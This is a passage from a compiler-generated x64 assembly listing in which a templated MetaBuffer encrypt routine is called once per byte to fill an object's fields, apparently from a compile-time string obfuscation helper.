  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
